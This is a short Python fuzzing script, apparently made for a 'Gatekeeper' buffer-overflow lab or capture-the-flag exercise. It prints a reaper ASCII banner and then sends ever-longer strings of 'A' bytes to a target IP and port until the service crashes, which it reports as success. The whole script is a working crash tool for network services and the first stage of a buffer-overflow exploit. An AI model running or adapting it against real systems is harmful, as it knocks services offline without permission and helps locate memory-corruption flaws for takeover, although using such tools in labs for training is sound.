#!/usr/bin/python3

import time, struct, sys
import socket as so

#   [ GATEKEEPER FUZZER ]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'




print(bcolors.OKGREEN +"               ...")
print("              ;::::; ")
print("            ;::::; :; ")
print("          ;:::::'   :; ")
print("         ;:::::;     ;. ")
print("        ,:::::'       ;           OOO\ ")
print("        ::::::;       ;          OOOOO\ ")
print("        ;:::::;       ;         OOOOOOOO ")
print("       ,;::::::;     ;'         / OOOOOOO ")
print("     ;:::::::::`. ,,,;.        /  / DOOOOOO ")
print("   .';:::::::::::::::::;,     /  /     DOOOO ")
print("  ,::::::;::::::;;;;::::;,   /  /        DOOO ")
print(" ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
print(" :`:::::::`;::::::;;::: ;::#  /            DOOO ")
print(" ::`:::::::`;:::::::: ;::::# /              DOO ")
print(" `:`:::::::`;:::::: ;::::::#/               DOO ")
print("  :::`:::::::`;; ;:::::::::##                OO ")
print("  ::::`:::::::`;::::::::;:::#                OO ")
print("  `:::::`::::::::::::;'`:;::#                O ")
print("   `:::::`::::::::;' /  / `:# ")
print("    ::::::`:::::;'  /  /   `# ")
print("  ")
print(" .:th3 r3aper is kn0ck1ng:.  ")
print(bcolors.ENDC +"")

payload = b"A" * 10


try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])
except:
    print(bcolors.FAIL+"[!] Usage: python3 fuzzer.py IP PORT"+bcolors.ENDC)
    sys.exit()

while(True):
    print("[+] Attempting to crash Gatekeeper at %s bytes" %len(payload))
    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    s.settimeout(5)

    try:
        s.connect((server,port))
        s.send(payload + b'\r\n\r\n')
        s.recv(1024)
        s.close()
        print ("[!] Fuzzing go brrrrr")
        time.sleep(1)
        payload = payload + (b"A") * 10

    except:
        print ("[+] No conn to target!")
        print(bcolors.OKGREEN+"[!] Success!")
        sys.exit()



